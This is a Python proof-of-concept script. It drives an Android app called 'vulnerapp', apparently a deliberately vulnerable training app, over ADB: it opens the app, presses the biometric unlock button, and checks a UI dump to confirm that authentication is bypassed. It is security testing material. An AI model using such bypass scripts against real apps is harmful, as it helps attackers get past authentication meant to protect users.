#!/usr/bin/env python3
import subprocess
import time
import re
import xml.etree.ElementTree as ET

def run_adb_cmd(cmd_list):
    """Run ADB command and return stdout"""
    try:
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        print(f"Error: {e}")
        return ""

def get_status_text_from_ui():
    """Extract Status Text using uiautomator dump"""
    try:
        # Dump UI
        subprocess.run(['adb', 'shell', 'uiautomator', 'dump', '/sdcard/window_dump.xml'], 
                      capture_output=True, check=True)
        # Pull XML
        subprocess.run(['adb', 'pull', '/sdcard/window_dump.xml', '.'], 
                      capture_output=True, check=True)
        
        tree = ET.parse('window_dump.xml')
        root = tree.getroot()
        
        # Look for the success message
        # "Biometric Auth Success! (Or Bypassed)"
        for node in root.iter('node'):
            text = node.get('text', '')
            if 'Biometric Auth Success' in text:
                return text
                
        return None
    except Exception as e:
        print(f"UI Dump Failed: {e}")
        return None

def main():
    print("=== Weakness: Biometric Authentication Bypass (PoC) ===")
    print("[*] Target: CryptoActivity (Flawed Auth Logic)")
    
    # 1. Launch Activity
    print("[*] Launching CryptoActivity...")
    run_adb_cmd(['adb', 'shell', 'am', 'start', '-n', 'com.dlh.vulnerapp/.CryptoActivity'])
    time.sleep(3)
    
    # 2. Click 'Unlock with Biometrics' (Button 3)
    # Strategy: Keyboard Nav
    # HOME -> TAB (VIP/1st) -> TAB (Token/2nd) -> TAB (Bio/3rd) -> ENTER
    print("[*] Navigating to 'Unlock with Biometrics' button...")
    
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '122']) # HOME (Focus Top/VIP)
    time.sleep(0.5)
    
    # We need to jump 2 times to reach the 3rd element?
    # Let's count focusable elements. 
    # Top->VIP(1)->Token(2)->Bio(3)
    # If HOME puts us on VIP:
    # TAB -> Token
    # TAB -> Bio
    
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '61']) # TAB (Focus Token)
    time.sleep(0.2)
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '61']) # TAB (Focus Bio)
    time.sleep(0.2)
    
    print("[*] Clicking 'Unlock with Biometrics'...")
    run_adb_cmd(['adb', 'shell', 'input', 'keyevent', '66']) # ENTER
    time.sleep(2)
    
    # 3. Verify Result
    print("[*] Verifying Authentication Status...")
    status_text = get_status_text_from_ui()
    
    if status_text:
        print(f"\n[+] SUCCESS! Found Status: '{status_text}'")
        print("[+] This confirms the Biometric Check was bypassed or non-existent.")
        print("[!] Vulnerability: The application allows access without validating biometric signature.")
    else:
        print("[-] 'Success' message not found. Navigation might be wrong.")
        # Minimal Debug: Print all text
        print("[DEBUG] Attempting fallback click (540, 1000)...")
        run_adb_cmd(['adb', 'shell', 'input', 'tap', '540', '1000']) # Fallback for bottom button
        time.sleep(2)
        status_text_retry = get_status_text_from_ui()
        if status_text_retry:
             print(f"\n[+] SUCCESS (Fallback)! Found Status: '{status_text_retry}'")
        else:
             print("[-] Still failed.")

if __name__ == "__main__":
    main()
